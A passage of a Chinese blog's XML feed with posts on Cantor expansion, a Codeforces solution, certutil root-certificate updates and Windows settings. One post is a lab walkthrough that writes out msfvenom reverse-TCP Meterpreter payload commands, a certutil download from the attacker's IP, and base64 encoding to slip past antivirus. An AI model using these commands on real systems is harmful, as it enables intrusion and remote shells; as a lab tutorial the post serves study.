\simn-1)\)</span>全排列后，其康托展开唯一且最大约为<span class="math inline">\(n!\)</span>，因此可以由更小的空间来储存这些排列。由公式可将<span class="math inline">\(X\)</span>逆推出唯一的一个排列。</p><h2 id="康托展开的逆运算">康托展开的逆运算</h2><p>既然康托展开是一个双射，那么一定可以通过康托展开值求出原排列，即可以求出n的全排列中第x大排列。</p><p>如 <span class="math inline">\(n=5,x=96\)</span> 时：</p><p>首先用 <span class="math inline">\(96-1\)</span> 得到 <span class="math inline">\(95\)</span> ，说明 <span class="math inline">\(x\)</span> 之前有 <span class="math inline">\(95\)</span> 个排列.(将此数本身减去 <span class="math inline">\(1\)</span> ) 用 <span class="math inline">\(95\)</span> 去除 <span class="math inline">\(4!\)</span> 得到 <span class="math inline">\(3\)</span> 余<span class="math inline">\(23\)</span>，说明有3个数比第 <span class="math inline">\(1\)</span> 位小，所以第一位是 <span class="math inline">\(4\)</span>. 用 <span class="math inline">\(23\)</span> 去除 <span class="math inline">\(3!\)</span> 得到 <span class="math inline">\(3\)</span> 余 <span class="math inline">\(5\)</span> ，说明有3个数比第 <span class="math inline">\(2\)</span> 位小，所以是 <span class="math inline">\(4\)</span> ，但是 <span class="math inline">\(4\)</span> 已出现过，因此是 <span class="math inline">\(5\)</span>. 用 <span class="math inline">\(5\)</span> 去除 <span class="math inline">\(2!\)</span> 得到 <span class="math inline">\(2\)</span> 余 <span class="math inline">\(1\)</span> ，类似地，这一位是 <span class="math inline">\(3\)</span>. 用 <span class="math inline">\(1\)</span> 去除 <span class="math inline">\(1!\)</span> 得到 <span class="math inline">\(1\)</span> 余 <span class="math inline">\(0\)</span> ，这一位是 <span class="math inline">\(2\)</span>. 最后一位只能是 <span class="math inline">\(1\)</span>. 所以这个数是 <span class="math inline">\(45321\)</span>.</p><p>按以上方法可以得出通用的算法。</p><h2 id="优化">优化</h2><h3 id="树状数组">树状数组</h3><p>我们在处理 <span class="math inline">\(a_i\)</span>时，要每次统计小于当前一位数且没有被选过的数字个数，复杂度为 <span class="math inline">\(\Theta (n^2)\)</span> .<br>考虑使用树状数组，建树时均赋值为 <span class="math inline">\(1\)</span>，被选中后 <span class="math inline">\(add(1, n, -1)\)</span>即可。<br>时间复杂度为 <span class="math inline">\(\Theta (n \log n)\)</span></p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 组合数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用正则表达式匹配C/C++注释</title>
      <link href="/2022/02/09/shi-yong-zheng-ze-biao-da-shi-pi-pei-c-c-zhu-shi/"/>
      <url>/2022/02/09/shi-yong-zheng-ze-biao-da-shi-pi-pei-c-c-zhu-shi/</url>
      
        <content type="html"><![CDATA[<p><code>//[\s\S]*?\n</code>, <code>([^\\*]|\\.)*?</code></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CodeforcesRound.770.Div2-F Fibonacci Additions</title>
      <link href="/2022/02/07/codeforcesround-770-div2-f-fibonacci-additions/"/>
      <url>/2022/02/07/codeforcesround-770-div2-f-fibonacci-additions/</url>
      
        <content type="html"><![CDATA[<h3 id="题目链接">题目链接</h3><blockquote><p><a href="https://codeforces.com/contest/1634/problem/F">Contest #770- Problem F</a></p></blockquote><h3 id="题目描述">题目描述</h3><p>You are given two arrays <span class="math inline">\(A\)</span> and<span class="math inline">\(B\)</span> of the same length. We will askyou to perform several Fibonacci additions on these arrays withdifferent parameters, and after each operation you have to reportwhether arrays <span class="math inline">\(A\)</span> and <span class="math inline">\(B\)</span> are equal modulo <span class="math inline">\(MOD\)</span> .</p><h3 id="注意事项">注意事项</h3><ul><li>中间变量会超出<code>INT_MAX</code></li><li><code>(bool) a[i]</code> 的使用</li></ul><h3 id="ac代码">AC代码</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> MAXN <span class="token operator">=</span> <span class="token number">3e5</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> q<span class="token punctuation">,</span> MOD<span class="token punctuation">,</span> a<span class="token punctuation">[</span>MAXN<span class="token punctuation">]</span><span class="token punctuation">,</span> f<span class="token punctuation">[</span>MAXN<span class="token punctuation">]</span><span class="token punctuation">,</span> cnt<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cout<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin <span class="token operator">&gt;&gt;</span> n <span class="token operator">&gt;&gt;</span> q <span class="token operator">&gt;&gt;</span> MOD<span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        f<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>f<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> f<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> MOD<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">&gt;&gt;</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">int</span> b<span class="token punctuation">;</span>        cin <span class="token operator">&gt;&gt;</span> b<span class="token punctuation">;</span>        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> b <span class="token operator">+</span> MOD<span class="token punctuation">)</span> <span class="token operator">%</span> MOD<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token punctuation">;</span> i <span class="token operator">&gt;=</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> a<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> a<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> MOD <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">%</span> MOD<span class="token punctuation">;</span> <span class="token comment">// 规避溢出和Narrowing报错</span>        cnt <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token keyword">bool</span><span class="token punctuation">)</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    cnt <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token keyword">bool</span><span class="token punctuation">)</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>q<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">char</span> flag<span class="token punctuation">;</span>        <span class="token keyword">int</span> l<span class="token punctuation">,</span> r<span class="token punctuation">;</span>        cin <span class="token operator">&gt;&gt;</span> flag <span class="token operator">&gt;&gt;</span> l <span class="token operator">&gt;&gt;</span> r<span class="token punctuation">;</span>        cnt <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token keyword">bool</span><span class="token punctuation">)</span> a<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> n<span class="token punctuation">)</span>            cnt <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token keyword">bool</span><span class="token punctuation">)</span> a<span class="token punctuation">[</span>r <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">&lt;=</span> n<span class="token punctuation">)</span>            cnt <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token keyword">bool</span><span class="token punctuation">)</span> a<span class="token punctuation">[</span>r <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token char">'A'</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> MOD <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> MOD<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> n<span class="token punctuation">)</span>            a<span class="token punctuation">[</span>r <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>r <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token char">'A'</span> <span class="token operator">?</span> MOD <span class="token operator">-</span> f<span class="token punctuation">[</span>r <span class="token operator">-</span> l <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">:</span> f<span class="token punctuation">[</span>r <span class="token operator">-</span> l <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> MOD<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">&lt;=</span> n<span class="token punctuation">)</span>            a<span class="token punctuation">[</span>r <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>r <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token char">'A'</span> <span class="token operator">?</span> MOD <span class="token operator">-</span> f<span class="token punctuation">[</span>r <span class="token operator">-</span> l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">:</span> f<span class="token punctuation">[</span>r <span class="token operator">-</span> l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> MOD<span class="token punctuation">;</span>        cnt <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token keyword">bool</span><span class="token punctuation">)</span> a<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> n<span class="token punctuation">)</span>            cnt <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token keyword">bool</span><span class="token punctuation">)</span> a<span class="token punctuation">[</span>r <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">&lt;=</span> n<span class="token punctuation">)</span>            cnt <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token keyword">bool</span><span class="token punctuation">)</span> a<span class="token punctuation">[</span>r <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token operator">!</span>cnt <span class="token operator">?</span> <span class="token string">"YES"</span> <span class="token operator">:</span> <span class="token string">"NO"</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ACM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> 编程 </tag>
            
            <tag> Codeforces </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用certutil进行渗透测试</title>
      <link href="/2022/02/07/li-yong-certutil-jin-xing-shen-tou-ce-shi/"/>
      <url>/2022/02/07/li-yong-certutil-jin-xing-shen-tou-ce-shi/</url>
      
        <content type="html"><![CDATA[<p>Certutil 是 Windows 操作系统上预装的工具，可用于校验文件MD5、SHA1、SHA256，下载恶意文件和免杀。</p><p>下面将介绍它在 Windows 渗透测试中的作用。</p><span id="more"></span><h2 id="certutil">certutil</h2><p>Certutil 是一个 CLI程序，可用于转储和显示证书颁发机构（CA），配置信息，证书服务， CA组件的备份和还原以及验证证书、密钥对和证书链，它作为证书服务的一部分安装。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic2.zhimg.com/80/v2-bffeeb2e11925a2168d59b9bce2dc021_720w.jpg"></p><p><strong>作为系统工具的它，为什么会成为一个攻击工具（后门）？</strong></p><p><strong>简单来说，就是非恶意软件攻击，下面是具体的操作示例。</strong></p><p><strong>环境</strong></p><ul><li>攻击者（kali 192.168.1.51）</li><li>靶机（Windows10 192.168.1.63）</li></ul><p><strong>编码</strong></p><p>Certutil 包含一个编码参数（编码）。这有助于在 Base64中编码文件的内容。这是在 Windows 中等效于 Linux 中的 base64 命令。</p><p>不能打开 .exe 可执行文件时，可以使用 certutil对可执行文件进行编码。然后传输编码后的数据，然后在接收机上对其进行解码。</p><p>首先创建一个名为 <code>file.txt</code> 的文本文件，输入一些内容，打开PowerShell。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic2.zhimg.com/80/v2-5e2ae50bf21ff7fc2f95f4084d41b6c1_720w.jpg"></p><blockquote><p>参数-encodehex 将数据转换为十六进制编码的文件。</p></blockquote><p><strong>解码</strong></p><p>Certutil 可以解码 Base64 编码的数据。使用 certutil 和参数-decode。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic2.zhimg.com/80/v2-88bf3e4cfbe59c8b80ec1efd1e28aac1_720w.jpg"></p><blockquote><p>参数 <code>-decodehex</code> 解码十六进制编码的文件。</p></blockquote><p><strong>散列</strong></p><p>获取数据并传递固定长度的输出字符串。使用哈希加密算法，例如MD5，SHA-1，SHA-256，可以验证两个文件是否相同。该校验和是用于执行检查的散列值的数据完整性，这是一种文件签名。通过比较校验和，我们可以识别重复文件。</p><p>命令 certutil -hashfile 生成指定哈希值。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic3.zhimg.com/80/v2-4749ebd1dc9eff155c0717a4bda28f66_720w.jpg"></p><blockquote><p>注意：哈希算法区分大小写，MD5。</p></blockquote><p><strong>下载</strong></p><p>certutil 还可用于从互联网下载文件。</p><p><code>certutil.exe -urlcache -split -f http://example.com/a.txt</code></p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic1.zhimg.com/80/v2-aef67dce4b66bfc28443d55b5a8ec6d4_720w.jpg"></p><p><strong>系统错误代码</strong></p><p>Certutil可以帮助你找到系统错误代码的消息文本，查看系统错误代码的含义。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic2.zhimg.com/80/v2-8dd4550df76bdf04408d16a72b4af8e9_720w.jpg"></p><h2 id="使用certutil进行渗透测试">使用Certutil进行渗透测试</h2><p><strong>提交恶意可执行文件</strong></p><p>前面提到，Certutil 可在未经任何验证或评估的情况下主动从 Internet下载文件。</p><p>Certutil可用于将文件从一个系统复制到另一个系统，以在攻击过程中横向移动一些攻击工具或其他文件。</p><p>使用<strong>msfvenom</strong>工具生成一个有效payload，用于与攻击机器进行反向TCP 连接。有效payload的格式设置为exe。执行成功后，payload 将在 root目录中创建文件。</p><p>使用由 Python One-liner 生成的 HTTP Server 传输可执行文件。</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.51 lport=1234 -f exe &gt; shell.exepython -m SimpleHTTPServer 80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p></p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic2.zhimg.com/80/v2-7920a143e7035e85f810e085ab570229_720w.jpg"></p><p>有效payload已托管在服务器上，在靶机（受害者）上执行有效payload之前，我们需要在攻击计算机上启动监听，以捕获执行有效payload后生成的会话。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic3.zhimg.com/80/v2-86eb16509ce4b63bac86d80646204742_720w.jpg"></p><p>成功启动攻击者的侦听器之后，进入靶机。在这里，我们有一个 PowerShell终端。我们需要将有效payload下载到这台机器上。使用 certutil来查找它。Certutil 将使用两个不同的用户代理建立到远程 Web服务器的两个连接。</p><p>有效payload成功传输到靶机之后。如图所示，执行有效payload。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic1.zhimg.com/80/v2-b37e126bc1a17f85212e345417929618_720w.jpg"></p><p>回到攻击机器，查看我们的侦听器生成并捕获的 meterpreter 的实例。运行<code>sysinfo</code> 查看系统的详细信息。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic2.zhimg.com/80/v2-1aa46309a3f6bde55897364446718a55_720w.jpg"></p><p>成功使用了 Certutil 和恶意可执行文件来 Getshell。</p><p><strong>提交恶意 DLL 编码</strong></p><p>Certutil 可对文件进行进行base64编码，攻击者可以使用经过混淆的文件来隐藏扫描攻击的证据。然后再解码这些文件。这就是certutil 发挥作用的地方。可以解码数据并避免杀毒软件察觉。Certutil还可以用于解码已隐藏在证书文件中的可移植可执行文件。</p><p><strong>有效载荷可以被编码或加密，以避免被检测。</strong></p><p>还是使用 msfvenom工具为与攻击机器的反向TCP连接生成有效payload。有效payload的格式在动态链接库文件.dll 中设置。命名为 dll.txt。成功执行后，将在 root目录中创建文件。现在，要传输该文件，我们可以使用 Python One-liner 生成的HTTP Server。</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.51 lport=1234 -f dll &gt; dll.txtpython -m SimpleHTTPServer 80</code></pre><p>有效payload已托管在服务器上，在靶机上执行有效payload之前，我们需要在攻击计算机上启动监听，以捕获在有效payload执行后将生成的会话。</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://pic3.zhimg.com/80/v2-1249881d9bdd45b8f9644d8fc976b162_720w.jpg" title="未找到图片：https://pic3.zhimg.com/80/v2-1249881d9bdd45b8f9644d8fc976b162_720w.jpg" alt="未找到图片：https://pic3.zhimg.com/80/v2-1249881d9bdd45b8f9644d8fc976b162_720w.jpg"><figcaption aria-hidden="true">未找到图片：https://pic3.zhimg.com/80/v2-1249881d9bdd45b8f9644d8fc976b162_720w.jpg</figcaption></figure><p>成功启动攻击者的监听之后再进入靶机。打开 PowerShell终端。我们需要将有效payload下载到这台机器上，并且必须谨慎进行。执行命令：</p><pre><code>certutil -urlcache -split -f http://192.168.1.51/dll.txt dll.txt | certutil -encode dll.txt edll.txt</code></pre><blockquote><p>文件被下载为文本文件，被编码为另一个文件。</p></blockquote><p>现在要执行有效载荷以损害受害者，我们必须对其进行解码。使用<code>-decode</code> 参数解码有效payload并将其保存为<code>exploit.dll</code>（杀毒软件不会察觉）。然后运行此 DLL。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic2.zhimg.com/80/v2-7b59f6325404206e6d5565ba40f3b841_720w.jpg"></p><p>回到攻击机器，以查看生成并捕获的 meterpreter 的实例。运行<code>sysinfo</code> 查看系统信息。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic1.zhimg.com/80/v2-c64d3342cc6797ffb957d81dea01eb50_720w.jpg"></p><p>成功使用 Certutil 和恶意exe文件进行 Getshell。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 渗透 </tag>
            
            <tag> Certutil </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows下使用certutil更新根证书</title>
      <link href="/2022/02/06/windows-xia-shi-yong-certutil-geng-xin-gen-zheng-shu/"/>
      <url>/2022/02/06/windows-xia-shi-yong-certutil-geng-xin-gen-zheng-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="certutil-从-windows-update-下载受信任的根证书">certutil: 从Windows Update 下载受信任的根证书</h2><p><strong>certutil.exe</strong> 是 Windows 10引入的证书管理工具。可用于从 Windows Update下载根证书的最新列表并将其保存到 SST 文件中。</p><p>要在 Windows 10 / 11 上生成 SST文件，请打开提权过的的命令行并执行以下命令：</p><p><code>certutil -generateSSTFromWU C:\path\to\cert\root\roots.sst</code></p><p>这条命令会更新 SST 文件。</p><p><a href="http://woshub.com/wp-content/uploads/2017/08/certutil.exe-generateSSTFromWU.jpg"><img src="https://googles.plus/images/loading.gif" data-original="http://woshub.com/wp-content/uploads/2017/08/certutil.exe-generateSSTFromWU.jpg" alt="certutil.exe -generateSSTFromWU 根.sst"></a></p><p>因此，包含最新根证书列表的 SST文件将出现在目标目录中。双击打开它。该文件是一个包含受信任根证书的容器。</p><p><a href="http://woshub.com/wp-content/uploads/2017/08/roots.sst-root-certificates.jpg"><img src="https://googles.plus/images/loading.gif" data-original="http://woshub.com/wp-content/uploads/2017/08/roots.sst-root-certificates.jpg" alt="受信任的 MSFT 根证书的roots.sst 列表"></a></p><p>可以从中导出您拥有的任何证书。显然，将证书导出并逐个安装是不合理的。</p><p><code>certutil -syncWithWU</code>命令可用于生成单独的证书文件。通过这种方式获得的证书可以<a href="http://woshub.com/how-to-deploy-certificate-by-using-group-policy/">使用GPO 部署到 Windows 设备上</a>。</p><p>可以使用 PowerShell 脚本从 SST文件安装所有证书，并将它们添加到计算机上受信任的根证书列表中：</p><pre class="line-numbers language-none"><code class="language-none">$sstStore = ( Get-ChildItem -Path C:\ps\rootsupd\roots.sst )  $sstStore | Import-Certificate -CertStoreLocation Cert:\LocalMachine\Root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>运行<strong>certmgr.msc</strong>管理单元并确保所有证书都已添加到<strong>受信任的根证书颁发机构</strong>。</p><p><a href="http://woshub.com/wp-content/uploads/2019/08/install-microsoft-trusted-list-certificates.jpg"><img src="https://googles.plus/images/loading.gif" data-original="http://woshub.com/wp-content/uploads/2019/08/install-microsoft-trusted-list-certificates.jpg" alt="使用 powershell 在 Windows 中安装 microsoft 受信任的根证书"></a></p><p>安装后的 Windows 干净副本在根存储中仅包含少量证书。如果计算机已连接到Internet，如果您的设备访问在其信任链中具有来自 Microsoft CTL 的指纹的HTTPS 站点或 SSL证书，则将自动（按需）安装其余的根证书。因此，通常不需要立即将 Microsoft信任的所有证书添加到本地证书存储区。 &nbsp;</p><h2 id="windows-中的证书信任列表-stl">Windows 中的证书信任列表(STL)</h2><p><strong>证书信任列表</strong>( CTL<strong>)</strong>只是由受信任方（在本例中为Microsoft）签名的数据列表（例如证书哈希）。Windows 客户端会定期从Windows Update 下载此 CTL，该 CTL 存储所有受信任的根 CA的哈希值。应该理解，此 CTL不包含证书本身，仅包含它们的哈希和属性（例如，友好名称）。Windows设备可以按需从证书信任列表中下载受信任的证书。</p><p>您可以手动下载并安装 CTL文件。为此，请下载文件http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/authrootstl.cab（每月更新两次）。使用任何归档程序（甚至Windows资源管理器），解压<strong>authrootstl.cab</strong>归档文件的内容。它包含一个<strong>authroot.stl</strong>文件。</p><p><a href="http://woshub.com/wp-content/uploads/2017/08/authroot.stl_.jpg"><img src="https://googles.plus/images/loading.gif" data-original="http://woshub.com/wp-content/uploads/2017/08/authroot.stl_.jpg" alt="authroot.stl。"></a></p><p><code>authroot.stl</code>文件是一个容器，其中包含证书信任列表格式的受信任证书指纹列表。</p><p><a href="http://woshub.com/wp-content/uploads/2019/08/Microsoft-Certificate-Trust-List.jpg"><img src="https://googles.plus/images/loading.gif" data-original="http://woshub.com/wp-content/uploads/2019/08/Microsoft-Certificate-Trust-List.jpg" alt="Microsoft 证书信任列表"></a></p><p>您可以使用 certutil 命令将此 CTL文件安装到受信任的根证书颁发机构：</p><p><code>certutil -enterprise -f -v -AddStore "Root" "C:\PS\authroot.stl"</code></p><p><a href="http://woshub.com/wp-content/uploads/2019/08/certutil-install-cert-trusted-list-.jpg"><img src="https://googles.plus/images/loading.gif" data-original="http://woshub.com/wp-content/uploads/2019/08/certutil-install-cert-trusted-list-.jpg" alt="certutil 安装证书受信任列表"></a></p><p>root "受信任的根证书颁发机构" CTL 0 添加到存储。 CertUtil：-addstore命令成功完成。</p><p>您还可以使用证书管理控制台（<strong>Trust Root CertificationAuthorities</strong> -&gt; <strong>Certificates</strong> -&gt;<strong>All Tasks</strong> -&gt;<strong>Import</strong>）导入证书。使用证书指纹指定 STL 文件的路径。</p><p><a href="http://woshub.com/wp-content/uploads/2017/08/import-trusted-root-certificates.jpg"><img src="https://googles.plus/images/loading.gif" data-original="http://woshub.com/wp-content/uploads/2017/08/import-trusted-root-certificates.jpg" alt="使用 certmgr snapin 导入受信任的根证书"></a></p><p>运行该命令后，证书管理器控制台 ( )的<strong>受信任的根证书颁发机构</strong><code>certmgr.msc</code>容器中会出现一个新的证书信任列表部分。</p><p><a href="http://woshub.com/wp-content/uploads/2017/08/certmgr-Certificate-Trust-List.jpg"><img src="https://googles.plus/images/loading.gif" data-original="http://woshub.com/wp-content/uploads/2017/08/certmgr-Certificate-Trust-List.jpg" alt="certmgr Microsoft 证书信任列表发布者"></a></p><p>同样，您可以下载并安装已从根证书程序中删除的已撤销（不允许）证书的列表。为此，请下载<strong>disallowedcertstl.cab</strong>文件(http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab)，将其解压缩，然后将其添加到不受信任的证书存储中命令：</p><p><code>certutil -enterprise -f -v -AddStore disallowed "C:\PS\disallowedcert.stl"</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 证书 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows系统修改网络名称</title>
      <link href="/2022/02/06/windows-xi-tong-xiu-gai-wang-luo-ming-cheng/"/>
      <url>/2022/02/06/windows-xi-tong-xiu-gai-wang-luo-ming-cheng/</url>
      
        <content type="html"><![CDATA[<p>打开注册表编辑器。在注册表中定位到以下键值：</p><p><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles\</code></p><p>在该项下面，你可能会看到一个或多个子项，每一项即代表一个网络</p><p>选中其中一项，在注册表编辑的右侧便会显示相应的键名和键值。在键名中找到名称为<code>ProfileName</code>的键，该键的键值即代表网络名称</p><p>要修改网络名称，只需要双击该行，然后在弹出的对话框中修改网络名称即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Terminal 常用快捷键</title>
